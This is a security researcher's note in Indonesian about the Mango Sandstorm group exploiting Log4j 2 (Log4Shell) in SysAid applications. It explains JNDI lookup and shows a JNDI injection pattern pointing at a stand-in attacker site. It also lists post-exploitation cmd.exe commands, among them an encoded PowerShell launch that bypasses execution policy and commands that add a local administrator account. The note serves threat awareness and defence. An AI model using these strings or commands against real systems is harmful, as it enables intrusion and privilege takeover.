## 25 Agustus 2022, Mango Sandstorm

#### Ringkasan Singkat
Mango Sandstorm, sebelumnya dikenal karena menggunakan eksploitasi Log4j 2 untuk menyerang aplikasi VMware, baru-baru ini menargetkan aplikasi SysAid menggunakan teknik yang sama. Begitu mereka mendapatkan akses awal, kelompok ini mendirikan persistensi, bergerak lateral dalam jaringan menggunakan alat hacking kustom dan terkenal, dan mengambil kredensial.

![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/f67bb7ac-2cc3-4a6e-ab31-06b8db9ce991)
> [!Note]
> [MERCURY memanfaatkan kerentanan Log4j 2 dalam sistem yang belum dipatch untuk menargetkan organisasi Israel](https://www.microsoft.com/en-us/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/)


## Kerentanan Log4j 2
Karena serangan Mango Sandstorm diinisiasi melalui kerentanan Log4j, mari telusuri lebih dalam serangan dan kerentanan tersebut.

![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/49b682a4-10a9-4b9b-be53-a0c80e00d01b)
> [Memperbaiki kerentanan Log4j](https://www.youtube.com/watch?v=ulOTK2pZLNU) | Microsoft Defender for Endpoint

#### Apa itu Log4j?
Log4j adalah perpustakaan logging Java yang banyak digunakan yang memungkinkan pengembang untuk mencatat peristiwa dan pesan dalam aplikasi mereka. Ini memberikan fleksibilitas dalam mengategorikan dan mengontrol output logging, memungkinkan debugging dan pemantauan aplikasi yang efektif.

#### Mengapa Log4j 2 dieksploitasi?
Log4j 2, versi terbaru dari Log4j, adalah kerangka logging Java yang banyak digunakan dan kuat. Namun, ia memiliki kerentanan kritis yang disebut Log4Shell (CVE-2021-44228, CVE-2021-45046, CVE-2021-44832), ***yang memungkinkan penyerang untuk menjalankan kode secara remote dengan mengeksploitasi fungsionalitas deserialisasi.***

#### Bagaimana penyerang mengeksploitasi Log4j 2 yang rentan secara tepat?
Penyerang mengeksploitasi sistem Log4j 2 yang rentan dengan mengirim data yang mengandung string tertentu. Log4j 2, saat mencoba memproses string ini, mengakses ***URL yang ditentukan melalui fitur JNDI Lookup***. Ini memungkinkan penyerang untuk men-download dan menjalankan kode Java berbahaya dalam sistem.
> [!Note]
> Java Naming and Directory Interface (JNDI) <br>
> Ini adalah API Java yang membantu aplikasi menemukan dan mengakses data dan sumber daya menggunakan nama.

#### URL yang ditentukan?
Berikut adalah pola serangan - **${indi:ldap//[situs penyerang]/a}**

misalnya
```
${indi:http//learningkijo.com/sub}
```

#### Perintah apa yang dieksekusi melalui eksploitasi Log4j 2?
```cmd
cmd.exe /C whoami
cmd.exe /C powershell -exec bypass -w 1 -enc UwB….
cmd.exe /C hostname
cmd.exe /C ipconfig /all
cmd.exe /C net user
cmd.exe /C net localgroup administrators
cmd.exe /C net user admin * /add
cmd.exe /C net localgroup Administrators admin /add
cmd.exe /C quser
```
## Referensi
1. [Panduan untuk mencegah, mendeteksi, dan mengejar eksploitasi kerentanan Log4j 2](https://www.microsoft.com/en-us/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/)
2. [Kerentanan RCE Log4j (CVE-2021-44228) Dijelaskan](https://www.youtube.com/watch?v=0-abhd-CLwQ)

#### Penafian
Pandangan dan pendapat yang dinyatakan di sini adalah milik penulis dan tidak selalu mencerminkan pandangan perusahaan.
